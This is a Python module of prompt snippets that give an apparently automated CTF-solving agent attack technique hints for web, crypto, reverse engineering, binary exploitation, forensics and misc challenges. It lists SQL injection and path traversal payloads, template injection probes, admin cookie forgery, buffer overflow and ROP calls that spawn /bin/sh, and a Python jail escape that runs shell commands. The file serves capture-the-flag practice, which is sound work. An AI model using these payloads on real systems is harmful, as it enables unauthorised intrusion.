"""Per-category technique reference snippets for solver prompts."""

from __future__ import annotations

WEB_TECHNIQUES = """\
WEB TECHNIQUE REFERENCE (from real CTF solutions):
- LFI: requests.get('http://host/path?param=../../../flag.txt')
- SQLi (string context): ' OR 1=1 -- , ' UNION SELECT flag FROM flags --
- SQLi (identifier / quoting context): if errors show delimited names (e.g. \
backticks, brackets), the app may splice parameters inside identifiers - test \
breakout using that DB's identifier rules and valid comment tokens (#, --) \
where SQL comments apply; classic quote payloads may be escaped while other \
characters are not
- SQLite-specific: ATTACH DATABASE, sqlite_master table queries
- Escaping vs context: map whether each parameter is used inside string literals, \
identifiers, or ORDER BY - the same sanitizer (e.g. addslashes-style) often \
misses delimiter-breaking characters
- SSTI: {{{{7*7}}}}, {{{{config}}}}, {{{{self.__class__.__mro__}}}}
- Multi-step: register -> login -> access protected endpoint -> get flag
- Client-side submit handlers: fetch HTML-linked *.js (login, auth, bundle) and \
mirror any hash/base64/HMAC transforms so POST bodies match what the browser sends
- Cookie manipulation: requests.get(url, cookies={{'admin': 'true'}})
  -> Try common cookie bypasses: admin=true, role=admin, authenticated=1
  -> Decode JWT/base64 cookies, forge admin role, modify session values
- Path traversal: ../, %2e%2e/, double encoding
- PHP type juggling: '0e1234' == 0, strcmp(array, str) returns NULL, loose comparison
- Encryption in web apps: if source shows DES/AES key, encrypt your payload with that key
  -> from Crypto.Cipher import DES; DES.new(key, DES.MODE_ECB).encrypt(payload)
- File read/inclusion: if source code shows file operations, try reading /flag or /home/*/flag*
- String filter bypass: if str_replace removes 'flag', use 'flflagag' (doubled), case variation
Use the `requests` library for HTTP interaction. Use `requests.Session()` for multi-step flows."""


CRYPTO_TECHNIQUES = """\
CRYPTO TECHNIQUE REFERENCE (from real CTF solutions):
- RSA weak key: factor n via factordb.com API or yafu, then d = inverse(e, phi)
- XOR: ciphertext ^ known_plaintext_prefix -> key fragment -> full key
  -> if flag format known (e.g. 'flag{{'), XOR first bytes of ciphertext with prefix to get key
- AES-CBC: known key+IV -> AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
- AES-ECB: from Crypto.Cipher import AES; AES.new(key, AES.MODE_ECB).decrypt(ct)
- DES/3DES: from Crypto.Cipher import DES; DES.new(key, DES.MODE_ECB).decrypt(ct)
- Hash collision: MD5/SHA brute-force with itertools.product
- LFSR: reconstruct state from seed/taps in file header, XOR keystream with ciphertext
  -> parse binary header (magic bytes, seed, tap positions, skip count) with struct.unpack
  -> implement LFSR shift register: bit = XOR of tapped positions, shift, feedback
  -> advance state by skip iterations, then XOR each chunk with LFSR output
- Many-time pad / repeated XOR: XOR pairs of ciphertexts, use crib-dragging with known words
- Modular arithmetic: use gmpy2.invert, pow(base, exp, mod)
- Stream ciphers: read ciphertext as bytes, apply inverse transform byte-by-byte
- Custom cipher in source: read the source code, understand encrypt(), write decrypt() as exact inverse
- Binary file format: always check for magic bytes/header with struct.unpack before ciphertext data
Use pycryptodome (from Crypto.Cipher import AES), gmpy2, sympy as needed."""


REV_TECHNIQUES = """\
REVERSE ENGINEERING TECHNIQUE REFERENCE (from real CTF solutions):
- XOR key extraction: identify pkey[] array, XOR with known flag prefix
- Transform chains: reverse each step (shift, substitute, permute) in reverse order
- Checker bypass: extract expected output, solve for input with z3 or manual inverse
- Binary strings: use subprocess to run 'strings -n 6' on ELF files
- Disassembly: subprocess.run(['objdump', '-d', binary]) to find constants and logic
- For Python bytecode: dis module, uncompyle6
- For C/C++ source: read the source carefully, identify the exact transform applied to plaintext,
  then write the inverse function step-by-step
- Binary file formats: check file header with 'file' command, identify architecture (x86, ARM, AVR)
- Intel HEX / firmware: parse .hex format, extract data section, apply byte-level transforms
- Constraint solving: from z3 import *; set up equations for each output byte, solve for input
Write an inverse function and apply it to the encoded data."""


PWN_TECHNIQUES = """\
PWN TECHNIQUE REFERENCE (from real CTF solutions):
- Buffer overflow: from pwn import *; p = remote(host, port, timeout=15); p.sendline(payload)
- Address calculation: use provided binary to find offsets
  -> from pwn import ELF; e = ELF('./binary'); e.symbols, e.got, e.plt
  -> Use cyclic() pattern to find offset: cyclic_find(crash_value)
- Format string: send %p.%p.%p to leak stack, %n to write
- ROP: from pwn import ROP; rop = ROP(elf); rop.call('system', ['/bin/sh'])
- ret2libc: leak libc base via GOT, compute system() address
- Shell interaction: after getting shell, use p.sendline('cat /home/*/flag*') or p.sendline('cat flag*')
- Interactive services with menus: parse menu options, select correct option, send input
  -> Always set timeout on remote() to avoid hanging: remote(host, port, timeout=15)
  -> Use p.recvuntil() to wait for prompts before sending data
Use pwntools (from pwn import *) for binary exploitation."""


FORENSICS_TECHNIQUES = """\
FORENSICS TECHNIQUE REFERENCE (from real CTF solutions):
- PCAP: from scapy.all import rdpcap, TCP, UDP, Raw; pkts = rdpcap('file.pcap')
  -> iterate packets, extract Raw layer data, decode payloads
  -> search for flag patterns in reassembled TCP streams
  -> check DNS queries, HTTP requests/responses, FTP data
  -> use subprocess.run(['strings', 'file.pcap']) as quick flag search
  -> try: subprocess.run(['tshark', '-r', 'file.pcap', '-Y', 'http', '-T', 'fields', '-e', 'http.file_data'])
- PCAP flag in filenames: look for flag patterns in HTTP URIs, DNS queries, exported objects
- Steganography: from PIL import Image -> check LSB, check EOF appended data
- Archives: subprocess.run(['binwalk', '-e', file]) to extract embedded files
- Disk images: subprocess.run(['fdisk', '-l', img]) then mount + search
- Git history: subprocess.run(['git', 'log', '--all', '-p']) -> grep for flag
- Base64 chains: repeatedly b64decode until readable
Use scapy, pyshark, PIL, subprocess with forensic tools."""


MISC_TECHNIQUES = """\
MISC TECHNIQUE REFERENCE (from real CTF solutions):
- Encoding chains: base64 -> hex -> ROT13 -> morse, try all combinations
- Python jail escape: __builtins__, __import__('os').system('cat flag*')
- Programming puzzles: parse input via socket, implement algorithm, send answer back
  -> for interactive TCP challenges: use pwntools (from pwn import remote)
  -> parse challenge prompt, compute solution, send response within timeout
  -> repeat for multiple rounds (some challenges have 50-100 rounds)
- Conway's Game of Life / cellular automata: implement the simulation, parse grid input, compute N generations
- Esoteric languages: brainfuck, whitespace -> use interpreter libraries
- File inspection: check file headers, look for appended data, alternate streams
- PCAP analysis: use scapy or strings to extract flag patterns from packet captures
  -> look for flag strings in DNS queries, HTTP payloads, FTP transfers, raw TCP data
  -> try: subprocess.run(['strings', 'file.pcap']) | grep flag
- Network service challenges: connect via TCP socket, interact with menu/protocol
Be creative and try multiple approaches."""


TECHNIQUE_HINTS: dict[str, str] = {
    "web": WEB_TECHNIQUES,
    "crypto": CRYPTO_TECHNIQUES,
    "rev": REV_TECHNIQUES,
    "pwn": PWN_TECHNIQUES,
    "forensics": FORENSICS_TECHNIQUES,
    "misc": MISC_TECHNIQUES,
}
